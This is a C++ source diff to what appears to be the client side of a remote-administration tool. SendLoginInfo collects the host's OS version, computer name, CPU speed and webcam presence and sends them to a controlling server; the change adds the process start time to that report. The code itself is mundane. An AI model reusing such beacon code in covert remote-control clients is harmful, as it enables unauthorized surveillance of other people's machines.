@@ -2,6 +2,9 @@
 #include "LoginServer.h"
 #include "Common.h"
 #include <string>
+#include <iostream>
+#include <iomanip>
+#include <ctime>
 
 /************************************************************************
 --------------------- 
@@ -122,10 +125,39 @@ std::string getSystemName()
 	return vname;
 }
 
+std::string formatTime(const FILETIME& fileTime) {
+	// 转换为 64 位时间
+	ULARGE_INTEGER ull;
+	ull.LowPart = fileTime.dwLowDateTime;
+	ull.HighPart = fileTime.dwHighDateTime;
+
+	// 转换为秒级时间戳
+	std::time_t startTime = static_cast<std::time_t>((ull.QuadPart / 10000000ULL) - 11644473600ULL);
+
+	// 格式化输出
+	std::tm* localTime = std::localtime(&startTime);
+	char buffer[100];
+	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localTime);
+	return std::string(buffer);
+}
+
+std::string getProcessTime() {
+	FILETIME creationTime, exitTime, kernelTime, userTime;
+
+	// 获取当前进程的时间信息
+	if (GetProcessTimes(GetCurrentProcess(), &creationTime, &exitTime, &kernelTime, &userTime)) {
+		return formatTime(creationTime);
+	}
+	std::time_t now = std::time(nullptr);
+	std::tm* t = std::localtime(&now);
+	char buffer[100];
+	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", t);
+	return buffer;
+}
 
 int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed)
 {
-	LOGIN_INFOR  LoginInfor = {0};
+	LOGIN_INFOR  LoginInfor;
 	LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
 	//获得操作系统信息
 	strcpy_s(LoginInfor.OsVerInfoEx, getSystemName().c_str());
@@ -148,9 +180,8 @@ int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed)
 	memcpy(LoginInfor.szPCName,szPCName,MAX_PATH);
 	LoginInfor.dwSpeed  = dwSpeed;
 	LoginInfor.dwCPUMHz = dwCPUMHz;
-	LoginInfor.ClientAddr = ClientAddr.sin_addr;
 	LoginInfor.bWebCamIsExist = bWebCamIsExist;
-
+	strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
 	int iRet = ClientObject->OnServerSending((char*)&LoginInfor, sizeof(LOGIN_INFOR));   
 
 	return iRet;
